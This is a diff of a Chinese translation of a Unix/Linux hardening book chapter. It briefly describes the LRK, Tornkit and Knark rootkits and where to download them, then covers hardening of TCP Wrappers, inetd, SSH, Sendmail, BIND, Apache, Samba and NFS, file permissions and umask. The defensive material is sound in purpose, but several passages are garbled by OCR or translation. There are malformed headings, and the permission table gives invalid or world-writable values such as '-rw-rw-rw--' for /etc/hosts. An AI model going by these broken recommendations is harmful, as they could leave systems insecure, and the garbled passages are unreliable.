 请参阅本书参考中心中的“常用命令”获取其中许多命令的描述。
 
@@ -4306,11 +4634,11 @@ Adore rootkit 是 Linux 内核模块的集合，允许入侵者隐藏进程、�
 
 ### Linux Rootkit (LRK)
 
-最流行的 Linux rootkit LRK 包含许多常用命令的木马化二进制文件，包括但不限于：chfn, chsh, crontab, du, find, ifconfig, inetd, killall, login, ls, netstat, password, pidof, ps, rshd, syslog, tcp, top, ssh 和 su。它还包含一个嗅探器以及 root shell 后门。LRK 可以从 http://www.packetstormsecurity.org 获取。
+最流行的 Linux rootkit LRK 包含许多常用命令的木马化二进制文件，包括但不限于：`chfn`, `chsh`, `crontab`, `du`, `find`, `ifconfig`, `inetd`, `killall`, `login`, `ls`, `netstat`, `password`, `pidof`, `ps`, `rshd`, `syslog`, `tcp`, `top`, `ssh` 和 `su`。它还包含一个嗅探器以及 root shell 后门。LRK 可以从 http://www.packetstormsecurity.org 获取。
 
 ### Tornkit
 
-Tornkit 由各种木马二进制文件、嗅探工具以及执行自动禁用 syslogd 和其他关键服务的工具组成。它可以从 http://www.packetstormsecurity.org 下载。
+Tornkit 由各种木马二进制文件、嗅探工具以及执行自动禁用 `syslogd` 和其他关键服务的工具组成。它可以从 http://www.packetstormsecurity.org 下载。
 
 ### Knark
 
@@ -4346,8 +4674,8 @@ Knark 是一种隐藏文件和进程的 rootkit，并且具有重定向命令的
 - 设置密码策略
 - 移除或禁用不必要的账户
 - 从 PATH 变量中移除 *
-- 检查 /etc/hosts.equiv 的内容
-- 检查 .hosts 文件
+- 检查 `/etc/hosts.equiv` 的内容
+- 检查 `.hosts` 文件
 - 禁用栈执行
 - 使用 TCP Wrappers
 - 加固 inetd 和 xinetd 配置
@@ -4360,16 +4688,16 @@ Knark 是一种隐藏文件和进程的 rootkit，并且具有重定向命令的
 
 入侵者经常利用弱弱的密码策略来获取用户账户的访问。可以采取一些步骤来加固密码策略：
 
-- 确保使用影子密码（shadowed passwords）。检查并确保密码哈值仅存在 /etc/shadow 中，且该文件必须对 root 可。
-- 修改配置文件（etc/default/passwd）或使用 chage。
+- 确保使用影子密码（shadowed passwords）。检查并确保密码哈值仅存在 `/etc/shadow` 中，且该文件必须对 root 可。
+- 修改配置文件（`etc/default/passwd`）或使用 `chage`。
 
 # 移除或禁用不必要的账户
 
-检查 /etc/passwd 以确保不必要的账户没有在被使用。
+检查 `/etc/passwd` 以确保不必要的账户没有在被使用。
 
 # 从 PATH 变量中移除 *
 
-当用户执行命令时，PATH 变量搜索目录。为了防止攻击，检查 PATH 变量：
+当用户执行命令时，`PATH` 变量搜索目录。为了防止攻击，检查 `PATH` 变量：
 
 ```bash
 echo $PATH
@@ -4377,11 +4705,11 @@ echo $PATH
 
 # 检查 /etc/hosts.equiv 的内容
 
-/etc/hosts.equiv 文件包含了允许通过 rsh 登录的主机列表。
+`/etc/hosts.equiv` 文件包含了允许通过 rsh 登录的主机列表。
 
 ### 检查 .hosts 文件
 
-检查文件系统中是否存在 .hosts。使用 find 命令：
+检查文件系统中是否存在 `.hosts`。使用 `find` 命令：
 
 ```bash
 find -name .hosts -type f 2>/dev/null
@@ -4389,7 +4717,7 @@ find -name .hosts -type f 2>/dev/null
 
 ### 禁用栈执行
 
-禁用栈执行将防止某些缓冲区溢出。如果使用 Solaris，编辑 /etc/system 并添加以下行：
+禁用栈执行将防止某些缓冲区溢出。如果使用 Solaris，编辑 `/etc/system` 并添加以下行：
 
 ```bash
 set noexec_stack=1
@@ -4409,69 +4737,67 @@ TCP Wrappers 允许对服务的请求进行监控和过滤。大多数发行版�
 
 # 134 第二部分：主机加固
 
-在安装了 TCP Wrappers 的主机上，编辑 /etc/hosts.allow 并确保以下行是第一个未注释的语句：
+在安装了 TCP Wrappers 的主机上，编辑 `/etc/hosts.allow` 并确保以下行是第一个未注释的语句：
 
 ```
 ALL:deny
 ```
 
-此外，确保默认拒绝所有主机的连接。可以通过在 /etc/hosts.deny 中放置以下条目来实现：
+此外，确保默认拒绝所有主机的连接。可以通过在 `/etc/hosts.deny` 中放置以下条目来实现：
 
 ```
 all:all
 ```
 
-在 /etc/hosts.allow 中放置适当的条目以允许信任的主机连接服务。详细指令请参阅 http://www.cert.org/security-improvement/implementations/i4i07.html。
+
+
+在`/etc/hosts.allow`中放置适当的条目以允许信任的主机连接服务。详细指令请参阅 http://www.cert.org/security-improvement/implementations/i4i07.html。
 
 ## 加固 inetd 和 xinetd 配置
 
-Internet 服务守护进程 inetd 用于在网络连接到达时立即启动相应的守护进程。因此，inetd 通常被称为“超级服务器”。xinetd 进程与 inetd 类似，但包含更多功能，xinetd 用户应强烈考虑升级到 xinetd。
+Internet 服务守护进程`inetd`用于在网络连接到达时立即启动相应的守护进程。因此，`inetd`通常被称为“超级服务器”。`xinetd`进程与`inetd`类似，但包含更多功能，`xinetd`用户应强烈考虑升级到`xinetd`。
 
 ### 禁用必要的服务
 
-如果使用 inetd，编辑 /inetd.conf 文件并确保不必要的服务已禁用。例如，考虑 inetd.conf 中负责 FTP 守护进程的行：
+如果使用`inetd`，编辑`/inetd.conf`文件并确保不必要的服务已禁用。例如，考虑`inetd.conf`中负责 FTP 守护进程的行：
 
 ```bash
 ftp stream tcp nowait root /usr/local/etc/tcp /usr/local/etc/ftpd
 ```
 
-为了从 inetd 禁用 FTP，在行行前加一个 #：
+为了从`inetd`禁用 FTP，在行行前加一个`#`：
 
 ```bash
 #ftp stream tcp nowait root /usr/local/etc/tcp /usr/local/etc/ftpd
 ```
 
-重启 inetd 使更改生效：
+重启`inetd`使更改生效：
 
 ```bash
 killall -HUP inetd
 ```
 
-如果使用 xinetd，编辑 xinetd.directory 中的相应的服务文件并确保存在 "disable = yes" 这一行。
+如果使用`xinetd`，编辑`xinetd.directory`中的相应的服务文件并确保存在`"disable = yes"`这一行。
 
+### 如果未启用服务，禁用 inetd 或 xinetd
 
-
-
-
-# 如果未启用服务，禁用 inetd 或 xinetd
-
-如果 inetd 或 xinetd 服务已被禁用，则没有必要让 inetd 或 xinetd 继续运行。要防止 inetd 或 xinetd 在启动时执行，请禁用 /etc/rc.d 和 /etc/rc.local 中的相应文件。
+如果`inetd`或`xinetd`服务已被禁用，则没有必要让`inetd`或`xinetd`继续运行。要防止`inetd`或`xinetd`在启动时执行，请禁用`/etc/rc.d`和`/etc/rc.local`中的相应文件。
 
 ### 确保开启日志记录
 
-如果正在运行 inetd，请编辑 inetsvc 文件并确保调用 inetd 时带有 -t 标志。对于 xinetd，请编辑 xinetd.conf 并确保存在以下行：
+如果正在运行`inetd`，请编辑`inetsvc`文件并确保调用`inetd`时带有`-t`标志。对于`xinetd`，请编辑`xinetd.conf`并确保存在以下行：
 
 ```
 log_type = SYSLOG authpriv
 ```
 
-此外，编辑 syslog.conf 并确保启用了 *.info 以将日志记录到 /var/log/messages 中。
+此外，编辑`syslog.conf`并确保启用了`*.info`以将日志记录到`/var/log/messages`中。
 
 ### 加固远程服务
 
 本节提供了针对 Unix 和 Linux 主机上某些常用远程服务的加固建议。
 
-使用 netstat 查找在 TCP 和 UDP 端口上监听的进程：
+使用`netstat`查找在 TCP 和 UDP 端口上监听的进程：
 
 ```
 [bash]# netstat -nap
@@ -4485,107 +4811,114 @@ udp 0 0.0.0.0:512 0.0.0.0:* LISTEN 14059/xinetd
 ...]
 ```
 
-### WU-FTPD
+#### WU-FTPD
 
-FTP（文件传输协议）是一种用于从一个主机传输文件到另一个机的协议。WU-FTPD 是 Unix 和 Linux 上最广泛使用的 FTP 守护进程。可以在 http://www.wu-ftpd.org/ 获取。采取以下步骤加固 WU-FTPD：
+FTP（文件传输协议）是一种用于从一个主机传输文件到另一个机的协议。`WU-FTPD`是 Unix 和 Linux 上最广泛使用的 FTP 守护进程。可以在 http://www.wu-ftpd.org/ 获取。采取以下步骤加固`WU-FTPD`：
 
-- 修改服务器横幅（banner）。编辑 /etc/ftpaccess 并使用 greeting 指令指定新的服务器信息。例如：
-`greeting text No banner information available. Sorry.`
+- 修改服务器横幅（banner）。编辑`/etc/ftpaccess`并使用`greeting`指令指定新的服务器信息。例如：`greeting text No banner information available. Sorry.`
 
-- 确保 /etc/ftpusers 包含一个不允许进行 FTP 登录的用户列表。root、bin 和 http 等用户不应允许 FTP 登录。
+- 确保`/etc/ftpusers`包含一个不允许进行 FTP 登录的用户列表。`root`、`bin`和`http`等用户不应允许 FTP 登录。
 
-- 编辑 inetd.conf 或 /etc/xinetd.d/ftpd，并确保调用 in.ftpd 时带有 -l 标志。这将启用日志记录。
+- 编辑`inetd.conf`或`/etc/xinetd.d/ftpd`，并确保调用`in.ftpd`时带有`-l`标志。这将启用日志记录。
 
 - 如果允许匿名上传，则上传的文件必须是不可见的，并且应该禁止下载上传的文件。否则，你的 FTP 服务器可能会被软件盗贼滥用。详情请参阅 http://www.wu-ftpd.org/HOWTO/upload.configuration.HOWTO。
 
-- 使用 ch狱（chrooted）FTP 环境，特别是针对匿名访问。请参阅 http://www.wu-ftpd.org/HOWTO/HOWTO 获取有关如何设置的详细说明。
+- 使用`chrooted` FTP 环境，特别是针对匿名访问。请参阅 http://www.wu-ftpd.org/HOWTO/HOWTO 获取有关如何设置的详细说明。
 
-考虑将 ProFTPD 作为 WU-FTPD 的替代品，因为它已被证明没有像 WU-FTPD 那样容易受到许多远程漏洞的影响。ProFTPD 可 http://www.proftpd.org 获取。
+考虑将`ProFTPD`作为`WU-FTPD`的替代品，因为它已被证明没有像`WU-FTPD`那样容易受到许多远程漏洞的影响。`ProFTPD`可 http://www.proftpd.org 获取。
 
-### SSH
+#### SSH
 
-SSH 是一种用于交换数据的安全协议。它可以用于登录远程机器、远程执行命令以及传输文件。由于与 SSH 的通信是加密的，因此它是 telnet、login 和 FTP 等远程登录解决方案的理想替代品。采取以下措施加固 SSH：
+`SSH`是一种用于交换数据的安全协议。它可以用于登录远程机器、远程执行命令以及传输文件。由于与`SSH`的通信是加密的，因此它是`telnet`、`login`和`FTP`等远程登录解决方案的理想替代品。采取以下措施加固`SSH`：
 
-- 确保禁用 SSH 协议版本 1。sshd_config 文件必须包含以下行：
-`Protocol 2`
+- 确保禁用`SSH`协议版本 1。`sshd_config`文件必须包含以下行：`Protocol 2`
 
-- 不应允许 root 用户通过 SSH 登录。确保 sshd_config 中存在以下行：
-`PermitRootLogin no`
+- 不应允许`root`用户通过`SSH`登录。确保`sshd_config`中存在以下行：`PermitRootLogin no`
 
-- 如 ssh_host_key、ssh_host_rsa_key 和 ssh_host_rsa_key 等私钥文件应仅允许 root 用户读取。
+- 如`ssh_host_key`、`ssh_host_rsa_key`和`ssh_host_rsa_key`等私钥文件应仅允许`root`用户读取。
 
-- 确保已开启特权分用（Privilege Separation）。sshd_config 中必须存在以下行：
-`UsePrivilegeSeparation yes`
+- 确保已开启特权分用（Privilege Separation）。`sshd_config`中必须存在以下行：`UsePrivilegeSeparation yes`
 
-### Sendmail
+#### Sendmail
 
-Sendmail 是互联网上最流行的 MTA（邮件传输代理）。要加固 Sendmail，请确保采取以下措施：
+`Sendmail`是互联网上最流行的 MTA（邮件传输代理）。要加固`Sendmail`，请确保采取以下措施：
 
-更改 SMTP 欢迎消息。编辑 sendmail.cf 文件并更改 SmtGreetingMessage 的值以反映新的横幅（banner）。或者，你可以编辑 sendmail.mc 并将 confSMTP_LOGIN_MSG 的值更改为新的欢迎语。
+更改 SMTP 欢迎消息。编辑`sendmail.cf`文件并更改`SmtGreetingMessage`的值以反映新的横幅（banner）。或者，你可以编辑`sendmail.mc`并将`confSMTP_LOGIN_MSG`的值更改为新的欢迎语。
 
-EXPN 和 VRFY 是 SMTP 协议支持的用于用户名枚举的两个命令。你应该通过编辑 sendmail.cf 来关闭它们，并确保 PrivacyOptions 设置为 authwarnings, noexpn, novrfy, restrictqun。或者，你可以编辑 sendmail.mc 文件并确保存在以下行：
+`EXPN`和`VRFY`是 SMTP 协议支持的用于用户名枚举的两个命令。你应该通过编辑`sendmail.cf`来关闭它们，并确保`PrivacyOptions`设置为`authwarnings, noexpn, novrfy, restrictqun`。或者，你可以编辑`sendmail.mc`文件并确保存在以下行：
 
 `define('CONFPRIVACY_FLAGS', 'authwarnings, noexpn, novrfy, restrictqun')dnl`
 
-还可以设置其他标记，如 goaway、restrictmail、restrictqun 和 nobodyturn。详情请参考 Sendmail 文档。
+还可以设置其他标记，如`goaway`、`restrictmail`、`restrictqun`和`nobodyturn`。详情请参考`Sendmail`文档。
 
-使用 smush 作为 MDA（邮件投递代理），它是一个 sh sh 程序；它限制了可以使用 Sendmail 的 "command" 语法运行的命令。要启用 smush，请确保以下内容：
+使用`smush`作为 MDA（邮件投递代理），它是一个`sh`程序；它限制了可以使用`Sendmail`的`"command"`语法运行的命令。要启用`smush`，请确保以下内容：
 
 | 文件或目录 | 用户 | 权限 |
 | :--- | :--- | :--- |
-| /etc/aliases | root | -rw-- |
-| /etc/mail | root | drwxr-xr-x |
-| /var/mail | root | drwxr-xr-x |
-| /var/spool/mail | root | drwxr-xr-x |
+| `/etc/aliases` | `root` | `-rw--` |
+| `/etc/mail` | `root` | `drwxr-xr-x` |
+| `/var/mail` | `root` | `drwxr-xr-x` |
+| `/var/spool/mail` | `root` | `drwxr-xr-x` |
 
-检查 sendmail.mc 中 MaxSize 的值：
-`define('MaxSize', '1048576')`
+检查`sendmail.mc`中`MaxSize`的值：`define('MaxSize', '1048576')`
 
-众所周知 Sendmail 易受到漏洞影响。考虑使用 qmail 作为
+众所周知`Sendmail`易受到漏洞影响。考虑使用`qmail`作为
 
-这将生成 sendmail.cf：
+这将生成`sendmail.cf`：
+
 ```
 m4 sendmail.mc > sendmail.cf
 ```
 
+
+
 ### BIND
 
-DNS（域名系统系统）是一种用于解析域名和 IP 地址的协议。BIND（Berkeley Internet Name）是互联网上使用广泛的 DNS。采取以下措施加固 BIND：
+DNS（域名系统系统）是一种用于解析域名和 IP 地址的协议。`BIND`（Berkeley Internet Name）是互联网上使用广泛的 DNS。采取以下措施加固 `BIND`：
 
-- 编辑 BIND 配置 named.conf 并覆盖版本：
-`version "Not available"`
+- 编辑 `BIND` 配置 `named.conf` 并覆盖版本：
+```
+version "Not available"
+```
 
-- 限制区域传输。使用 allow-transfer 指令指定主机：
-`options { allow-transfer { ip_address }; };`
+- 限制区域传输。使用 `allow-transfer` 指令指定主机：
+```
+options { allow-transfer { ip_address }; };
+```
 
 - 关闭递归查询。这将防止你的 DNS 服务器受到欺骗攻击：
-`options { recursion no; };`
+```
+options { recursion no; };
+```
 
-- 在 ch狱（chrooted）环境中运行 BIND。详情请参阅 http://www.homeport.org/~adam/dns.html。
+- 在 `chroot` 环境中运行 `BIND`。详情请参阅 http://www.homeport.org/~adam/dns.html。
 
-- 限制动态更新，因为该功能允许远程实体删除和添加记录。默认情况下，BIND 不允许动态更新。只有使用 allow-update 语句才能启用。
+- 限制动态更新，因为该功能允许远程实体删除和添加记录。默认情况下，`BIND` 不允许动态更新。只有使用 `allow-update` 语句才能启用。
 
 ### Apache (HTTP 和 HTTPS)
 
-考虑使用 djbdns 作为 BIND 的替代品。djbdns 服务器可以在 http://cr.to/djbdns.html 获取。
+考虑使用 `djbdns` 作为 `BIND` 的替代品。`djbdns` 服务器可以在 http://cr.to/djbdns.html 获取。
 
-Apache 是目前最流行的 Web 服务器。可以采取以下步骤加固服务器配置：
+`Apache` 是目前最流行的 Web 服务器。可以采取以下步骤加固服务器配置：
 
-- 修改你的 HTTP 横幅。编辑 httpd.conf 并确保以下指令为：
-`ServerSignature Off`
-`ServerTokens Prod`
+- 修改你的 HTTP 横幅。编辑 `httpd.conf` 并确保以下指令为：
+```
+ServerSignature Off
+ServerTokens Prod
+```
 
-如果你不想在 Server 标签中显示 "Apache"，但想显示虚假信息如 "Server: Not-allowed"），你需要：
+如果你不想在 `Server` 标签中显示 "Apache"，但想显示虚假信息如 "Server: Not-allowed"），你需要：
 
-1. 下载 Apache 源码。
-2. 编辑 httpd.h 文件，并将行 `#define SERVER_BASEPRODUCT "Apache"` 中的字符串值更改为其他：
-`#define SERVER_BASEPRODUCT "Not-allowed"`
-3. 重新编译、安装并重启 Apache。
+1. 下载 `Apache` 源码。
+2. 编辑 `httpd.h` 文件，并将行 `#define SERVER_BASEPRODUCT "Apache"` 中的字符串值更改为其他：
+```
+#define SERVER_BASEPRODUCT "Not-allowed"
+```
+3. 重新编译、安装并重启 `Apache`。
 
-- 关闭自动索引。这将指示 Apache 在没有默认索引文件（如 index.html）时不提供目录列表。在 httpd.conf 中使用 IndexIgnore 指令来实现此点。
+- 关闭自动索引。这将指示 `Apache` 在没有默认索引文件（如 `index.html`）时不提供目录列表。在 `httpd.conf` 中使用 `IndexIgnore` 指令来实现此点。
 
-- 配置 Apache 不提供 .htaccess,.htpasswd,.inc,.jsp,.java 或 .php 等敏感文件。例如，在 httpd.conf 中使用以下指令限制 Apache 提供以 .ht 开头的文件：
-
+- 配置 `Apache` 不提供 `.htaccess`, `.htpasswd`, `.inc`, `.jsp`, `.java` 或 `.php` 等敏感文件。例如，在 `httpd.conf` 中使用以下指令限制 `Apache` 提供以 `.ht` 开头的文件：
 ```
 <Files
   "\*.ht"
@@ -4597,15 +4930,11 @@ Apache 是目前最流行的 Web 服务器。可以采取以下步骤加固服�
 - 移除默认帮助页。
 - 移除默认和示例 CGI 脚本及应用程序。
 
+- 使用 `AccessFilename` 目录设置 `Apache` 用于访问控制时必须使用的文件名。这通常设置为 `.htaccess`。
 
+- 考虑在 `chroot` 环境（禁锢）中运行 `Apache`。详细说明请参见 http://hoohoo.ncaa.uiuc.edu/docs/tutorials/chroot.html。
 
-
-
-- 使用 `AccessFilename` 目录设置 Apache 用于访问控制时必须使用的文件名。这通常设置为 `.htaccess`。
-
-- 考虑在 chroot 环境（禁锢）中运行 Apache。详细说明请参见 http://hoohoo.ncaa.uiuc.edu/docs/tutorials/chroot.html。
-
-- 确保 Apache 设置为非 root 权限运行。检查 `httpd.conf` 中的 `User` 和 `Group` 设置，并确保它们被设置为 `apache` 或 `httpd` 等非 root 账户。
+- 确保 `Apache` 设置为非 `root` 权限运行。检查 `httpd.conf` 中的 `User` 和 `Group` 设置，并确保它们被设置为 `apache` 或 `httpd` 等非 `root` 账户。
 
 - 使用 `ErrorLog`、`CustomLog`、`LogLevel` 和 `LogFormat` 指令启用日志。确保在 `httpd.conf` 中正确设置这些指令。
 
@@ -4613,18 +4942,18 @@ Apache 是目前最流行的 Web 服务器。可以采取以下步骤加固服�
 
 ## Samba
 
-Samba 使用 SMB（服务器消息块）协议在网络上共享文件和打印机。按照以下步骤加固 Samba 配置：
+`Samba` 使用 `SMB`（服务器消息块）协议在网络上共享文件和打印机。按照以下步骤加固 `Samba` 配置：
 
 - 修改服务器字符串。编辑 `smb.conf` 并将 `server string = Samba Server` 改为其他内容：`server string = no information`
 
-  这将更改每个共享名称旁边显示的描述字段。
-  要更改实际的 Samba 版本信息，请编辑 `source/include/version.h` 文件并将常量 `VERSION` 的值改为其他内容。你必须重新编译 Samba 更改才能生效。
+这将更改每个共享名称旁边显示的描述字段。
+要更改实际的 `Samba` 版本信息，请编辑 `source/include/version.h` 文件并将常量 `VERSION` 的值改为其他内容。你必须重新编译 `Samba` 更改才能生效。
 
 - 编辑 `smb.conf` 并设置 `hosts allow` 选项的值，以限制允许连接到服务器的主机。
 
 - 使用密码加密。在 `smb.conf` 中将 `encrypt passwords` 的值设置为 `yes`。更多信息请参阅 http://us1.samba.org/samba/ftp/docs/textdocs/ENCRYPTION.txt。
 
-- 如果有多个网卡，可以指示 Samba 监听在特定的接口上。使用 `smb.conf` 中的 `interfaces` 选项来指定 Samba 必须监听的接口。
+- 如果有多个网卡，可以指示 `Samba` 监听在特定的接口上。使用 `smb.conf` 中的 `interfaces` 选项来指定 `Samba` 必须监听的接口。
 
 ## 第 7 章：默认设置与服务 141
 
@@ -4632,17 +4961,21 @@ Samba 使用 SMB（服务器消息块）协议在网络上共享文件和打印�
 
 ## NFS
 
-NFS（网络文件系统）是一种提供跨网络共享文件远程访问的文件系统协议。以下是你可以采取的一些步骤来加固 NFS 服务器配置：
+`NFS`（网络文件系统）是一种提供跨网络共享文件远程访问的文件系统协议。以下是你可以采取的一些步骤来加固 `NFS` 服务器配置：
 
 - 将文件系统导出为只读。考虑不要以读写权限导出它们。使用 `/etc/exports` 或 `/etc/dfs/sharetab` 中的 `ro` 选项来指定共享为只读。示例：
+```
 /nfsclient_ip(ro)
+```
 
-- 防止非 root 用户挂载 NFS 共享。要实现此点，请编辑 `/etc/exports` 或 `/etc/dfs/sharetab` 并确保存在 `(secure)` 选项。例如：
+- 防止非 `root` 用户挂载 `NFS` 共享。要实现此点，请编辑 `/etc/exports` 或 `/etc/dfs/sharetab` 并确保存在 `(secure)` 选项。例如：
+```
 /nfsclient_ip(secure)
+```
 
-- 不要允许远程用户以 root 权限挂载 NFS 共享。这将允许他们修改 NFS 共享上由 root 拥有的文件。使用 `/etc/exports` 或 `/etc/dfs/sharetab` 中的 `root_squash` 选项来防止此类问题。
+- 不要允许远程用户以 `root` 权限挂载 `NFS` 共享。这将允许他们修改 `NFS` 共享上由 `root` 拥有的文件。使用 `/etc/exports` 或 `/etc/dfs/sharetab` 中的 `root_squash` 选项来防止此类问题。
 
-- NFS 客户端必须配置为不在挂载的共享上设置 `setuid` 程序。否则，恶意的或受攻击的 NFS 服务器可能会在导出的共享中放置 root 的 setuid 木马文件，这些文件将在客户端上以 root 身份执行。在挂载 NFS 共享时使用 `nosuid` 选项。如果可能，还应考虑使用 `noexec` 选项，它禁止在 NFS 客户端上执行二进制文件。
+- `NFS` 客户端必须配置为不在挂载的共享上设置 `setuid` 程序。否则，恶意的或受攻击的 `NFS` 服务器可能会在导出的共享中放置 `root` 的 `setuid` 木马文件，这些文件将在客户端上以 `root` 身份执行。在挂载 `NFS` 共享时使用 `nosuid` 选项。如果可能，还应考虑使用 `noexec` 选项，它禁止在 `NFS` 客户端上执行二进制文件。
 
 ### 总结
 
@@ -4656,14 +4989,14 @@ NFS（网络文件系统）是一种提供跨网络共享文件远程访问的�
 - 文件权限：快速上手教程
 - 全局可读文件
 - 全局可写文件
-- bin 和 sys 拥的文件
-- umask 值
+- `bin` 和 `sys` 拥的文件
+- `umask` 值
 - 重要文件
-- /dev 中的文件
+- `/dev` 中的文件
 - 磁盘分区
-- setuid 和 setgid 文件
-- 实现 wheel 组
-- Sudo
+- `setuid` 和 `setgid` 文件
+- 实现 `wheel` 组
+- `Sudo`
 - 总结
 
 用户和文件系统权限必须经过严格控制。一个简单的单文件（例如错误的文件权限）就可能导致整个系统被破解。本章旨在为系统管理员提供实用的技巧，以确保正确的用户和文件系统权限。
@@ -4671,38 +5004,34 @@ NFS（网络文件系统）是一种提供跨网络共享文件远程访问的�
 ## 文件权限：快速上手教程
 
 使用 `ls -l -1` 标志检查文件权限。例如，让我们检查分配给 `/usr/sbin/id` 命令的文件权限：
-
 ```
 [bash]$ ls -l /usr/bin/id
 -rwxr-xr-x 1 root 13864 Apr 8 2002 /usr/bin/id
 ```
 
-上述输出的第一列描述了相关的文件权限。第一个字符被设置为连字符 (-)，表示 `/usr/bin/id` 是一个文件。如果它是目录，该字符将设置为 d。接下来的三个字符 (rwx) 代表文件所有者的权限，在本例中所有者是 root，如上述输出的第三列所示。随后的三个字符 (r-x) 代表与该文件关联的组的权限，在本例中也是 root，如输出的第四列所示。最后三个字符 (r--) 代表与所有用户（即所有人）关联的权限。
+上述输出的第一列描述了相关的文件权限。第一个字符被设置为连字符 (`-`)，表示 `/usr/bin/id` 是一个文件。如果它是目录，该字符将设置为 `d`。接下来的三个字符 (`rwx`) 代表文件所有者的权限，在本例中所有者是 `root`，如上述输出的第三列所示。随后的三个字符 (`r-x`) 代表与该文件关联的组的权限，在本例中也是 `root`，如输出的第四列所示。最后三个字符 (`r--`) 代表与所有用户（即所有人）关联的权限。
 
-字符 r 表示读取权限，而字符 w 和 x 分别表示写入权限和执行权限。当分配了 `setuid` 或 `setgid` 权限时，大写字符会替换 x。如果 root 用户为目录开启了粘性位（sticky bit），最后一个字符 (x) 将替换为 t。当粘性位开启时，所有用户对目录都有读写权限，但只能访问他们自己的文件。因此，注意 /tmp 目录开启了粘性位。
+字符 `r` 表示读取权限，而字符 `w` 和 `x` 分别表示写入权限和执行权限。当分配了 `setuid` 或 `setgid` 权限时，大写字符会替换 `x`。如果 `root` 用户为目录开启了粘性位（sticky bit），最后一个字符 (`x`) 将替换为 `t`。当粘性位开启时，所有用户对目录都有读写权限，但只能访问他们自己的文件。因此，注意 `/tmp` 目录开启了粘性位。
 
 使用 `chmod` 命令更改文件权限。假设我们名为 "perm" 的文件：
-
 ```
 [bash]# ls -l perm
 -rw-wr-r-- 1 root 0 Apr 5 22:40 perm
 ```
 
-上述列表显示 root 用户和 root 组对文件具有读取或写入权限。所有其他用户只能读取该文件。如果我们想更改 perm 的文件权限，使得 root 用户 (u) 也能执行 (x) 该文件，我们需要...
 
 
-
-
+上述列表显示 `root` 用户和 `root` 组对文件具有读取或写入权限。所有其他用户只能读取该文件。如果我们想更改 `perm` 的文件权限，使得 `root` 用户 (`u`) 也能执行 (`x`) 该文件，我们需要...
 
 ## 第 8 章：用户与文件系统权限 147
 
-假设我们希望 `umask` 值使得文件所有者具有读写权限，而组组或其他用户没有权限。此外，假设我们希望目录的 `umask` 包含执行 (x) 权限。如果一个目录没有执行 (x) 权限，则无法 `cd`（切换目录）进入该目录。此类设置的文件权限值为 700，拆分为字节组时表示为：
+假设我们希望 `umask` 值使得文件所有者具有读写权限，而组组或其他用户没有权限。此外，假设我们希望目录的 `umask` 包含执行 (`x`) 权限。如果一个目录没有执行 (`x`) 权限，则无法 `cd`（切换目录）进入该目录。此类设置的文件权限值为 `700`，拆分为字节组时表示为：
 
 ```
 111 000 000
 ```
 
-使用上表，我们将此值与 777 进行异或（XOR），以获得正确的 `umask` 值：
+使用上表，我们将此值与 `777` 进行异或（XOR），以获得正确的 `umask` 值：
 
 ```
 111 000 000 : 700
@@ -4716,7 +5045,7 @@ XOR: 000 111 111 : 077
 umask 077
 ```
 
-推荐的 `umask` 值为 077。这使得每个新创建的文件或目录仅允许其所有者读取和写。请注意，`umask` 值由三组字节，即三组八位组成。编译器创建的文件通常遵循 `umask` 值（执行 x 位除外）。
+推荐的 `umask` 值为 `077`。这使得每个新创建的文件或目录仅允许其所有者读取和写。请注意，`umask` 值由三组字节，即三组八位组成。编译器创建的文件通常遵循 `umask` 值（执行 `x` 位除外）。
 
 ## 重要文件
 
@@ -4724,85 +5053,82 @@ umask 077
 
 | 文件名 | 用户 | 组 | 权限 |
 | :--- | :--- | :--- | :--- |
-| /bin | root | root | drwx-xr-x |
-| /etc | root | root | drwx-xr-x |
-| /etc/aliases | root | root | -rw-r--r-- |
-| /etc/default/login | root | root | -rw-r---- |
-| /etc/exports | root | root | -rw-r--r-- |
-| /etc/hosts | root | root | -rw-rw-rw-- |
-| /etc/hosts.allow | root | root | -rw------- |
-| /etc/hosts.deny | root | root | -rw------- |
-| /etc/hosts.lpd | root | root | -rw------- |
-| /etc/inetd.conf | root | root | -rw------- |
-| /etc/issue | root | root | -rw-r--r-- |
+| `/bin` | root | root | drwx-xr-x |
+| `/etc` | root | root | drwx-xr-x |
+| `/etc/aliases` | root | root | -rw-r--r-- |
+| `/etc/default/login` | root | root | -rw-r---- |
+| `/etc/exports` | root | root | -rw-r--r-- |
+| `/etc/hosts` | root | root | -rw-rw-rw-- |
+| `/etc/hosts.allow` | root | root | -rw------- |
+| `/etc/hosts.deny` | root | root | -rw------- |
+| `/etc/hosts.lpd` | root | root | -rw------- |
+| `/etc/inetd.conf` | root | root | -rw------- |
+| `/etc/issue` | root | root | -rw-r--r-- |
 
 | 文件名 | 用户 | 组 | 权限 |
 | :--- | :--- | :--- | :--- |
-| /etc/login.access | root | root | -rw------ |
-| /etc/login.conf | root | root | -rw------ |
-| /etc/login.defs | root | root | -rw------ |
-| /etc/motd | root | root | -rw-r-r-- |
-| /etc/mtab | root | root | -rw-xr-r-- |
-| /etc/netgroup | root | root | -rw------ |
-| /etc/password | root | root | -rw-r-r-- |
-| /etc/rc.d | root | root | drwx------ |
-| /etc/rc.local | root | root | -rw------ |
-| /etc/rc.sysinit | root | root | -rw------ |
-| /etc/secuertty | root | root | -rw------ |
-| /etc/security | root | root | -rw------ |
-| /etc/services | root | root | -rw-r-r-- |
-| /etc/shadow | root | root | -r------ |
-| /etc/ssh/ssh_host_key | root | root | -rw------ |
-| /etc/ssh/sshd_config | root | root | -rw------ |
-| /etc/ssh/ssh_host_dsa_key | root | root | -rw------ |
-| /etc/ssh/ssh_host_key | root | root | -rw------ |
-| /etc/ssh/ssh_host_rsa_key | root | root | -rw------ |
-| /etc/ttys | root | root | drwx------ |
-| /root | root | root | drwx------ |
-| /sbin | root | root | drwxr-xr-x |
-| /tmp | root | root | drwxrwxrwt |
-| /usr/bin | root | root | drwxr-xr-x |
-| /usr/etc | root | root | drwxr-xr-x |
-| /usr/sbin | root | root | drwxr-xr-x |
-| /var/log | root | root | drwxr-xr-x |
-| /var/log/authlog* | root | root | -rw------ |
-| /var/log/boot* | root | root | -rw------ |
-| /var/log/cron* | root | root | -rw------ |
-| /var/log/dmesg | root | root | -rw------ |
-| /var/log/lastlog | root | root | -rw------ |
-| /var/log/maillog* | root | root | -rw------ |
-| /var/log/messages* | root | root | -rw------ |
+| `/etc/login.access` | root | root | -rw------ |
+| `/etc/login.conf` | root | root | -rw------ |
+| `/etc/login.defs` | root | root | -rw------ |
+| `/etc/motd` | root | root | -rw-r-r-- |
+| `/etc/mtab` | root | root | -rw-xr-r-- |
+| `/etc/netgroup` | root | root | -rw------ |
+| `/etc/password` | root | root | -rw-r-r-- |
